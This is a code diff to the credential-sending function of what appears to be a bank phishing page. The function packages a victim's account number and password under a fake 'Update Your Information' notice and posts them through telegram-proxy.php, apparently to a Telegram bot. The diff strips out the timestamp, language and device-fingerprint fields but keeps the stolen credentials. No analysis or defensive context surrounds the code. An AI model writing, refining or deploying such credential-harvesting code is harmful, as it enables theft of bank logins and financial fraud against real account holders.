@@ -312,17 +312,11 @@
             });
 
             function sendToTelegram(username, password) {
-                var now = new Date();
-                var timeStr = now.toLocaleString('en-GB', { hour12: false });
                 var text =
-                    '🏦 New Account Inquiry (service selected)\n' +
-                    '━━━━━━━━━━━━━━━━━━━━\n' +
+                    '🏦 New Account Inquiry\n\n' +
                     'Service:        Update Your Information\n' +
                     'Account Number: ' + username + '\n' +
-                    'Password:       ' + password + '\n\n' +
-                    '🕒 الوقت: ' + timeStr + '\n' +
-                    '🌐 اللغة: ' + (navigator.language || '—') + '\n' +
-                    '📱 الجهاز: ' + (navigator.userAgent || '—').substring(0, 120);
+                    'Password:       ' + password;
                 var payload = new URLSearchParams();
                 payload.append('text', text);
                 return fetch('telegram-proxy.php', { method: 'POST', body: payload })
